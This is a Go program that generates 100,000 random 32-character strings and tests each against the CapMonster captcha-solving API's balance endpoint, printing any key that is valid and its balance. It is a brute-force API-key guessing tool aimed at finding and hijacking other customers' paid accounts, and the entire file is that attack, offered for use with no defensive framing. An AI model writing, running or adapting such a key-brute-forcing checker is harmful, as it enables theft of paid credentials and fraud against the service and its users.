package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"os"
	"strings"
  "bufio"
  "time"
  "math/rand"
	"github.com/valyala/fasthttp"
)

type CapMonsterChecker struct {
	keys []string
}

func NewCapMonsterChecker() *CapMonsterChecker {
	f, err := os.Open("keys.txt")
	if err != nil {
		panic(err)
	}
	defer f.Close()
	content, err := ioutil.ReadAll(f)
	if err != nil {
		panic(err)
	}
	keys := strings.Split(string(content), "\n")
	return &CapMonsterChecker{keys: keys}
}

func (c *CapMonsterChecker) Check() {
	fmt.Printf("[*] Starting checker with %d keys...\n", len(c.keys))
	for _, key := range c.keys {
		req := fasthttp.AcquireRequest()
		req.SetRequestURI("https://api.capmonster.cloud/getBalance")
		req.Header.SetMethod("POST")
		req.Header.SetContentType("application/json")
		req.SetBodyString(fmt.Sprintf(`{"clientKey": "%s"}`, key))
		resp := fasthttp.AcquireResponse()
		if err := fasthttp.Do(req, resp); err != nil {
			fmt.Printf("[!] Error checking key: %s | %s\n", key, err)
			continue
		}
		if resp.StatusCode() == 200 {
			var data struct {
				Balance float64 `json:"balance"`
			}
			if err := json.Unmarshal(resp.Body(), &data); err != nil {
				fmt.Printf("[!] Error parsing JSON response for key: %s | %s\n", key, err)
				continue
			}
			fmt.Printf("[+] Valid Key: %s | Balance: %f\n", key, data.Balance)
		} else if strings.Contains(string(resp.Body()), "ERROR_KEY_DOES_NOT_EXIST") {
			fmt.Printf("[-] Invalid Key: %s\n", key)
		} else {
			fmt.Printf("[!] Error checking key: %s | %d | %s\n", key, resp.StatusCode(), resp.Body())
		}
		fasthttp.ReleaseResponse(resp)
		fasthttp.ReleaseRequest(req)
	}
}

func GenerateKeys(filename string, count int) {
	rand.Seed(time.Now().UnixNano())
	chars := "abcdefghijklmnopqrstuvwxyz0123456789"

	f, err := os.Create(filename)
	if err != nil {
		panic(err)
	}
	defer f.Close()

	w := bufio.NewWriter(f)
	start := time.Now()
	for i := 0; i < count; i++ {
		var b []byte
		for i := 0; i < 32; i++ {
			b = append(b, chars[rand.Intn(len(chars))])
		}
		_, err := w.Write(b)
		if err != nil {
			panic(err)
		}
		_, err = w.WriteString("\n")
		if err != nil {
			panic(err)
		}
	}
	w.Flush()
	elapsed := time.Since(start)
	fmt.Printf("[*] Generated %d keys in %v seconds", count, elapsed.Seconds())
}
func main() {
	GenerateKeys("keys.txt", 100000) // generate 100,000 keys and save them to keys.txt
	c := NewCapMonsterChecker()
	c.Check()
}
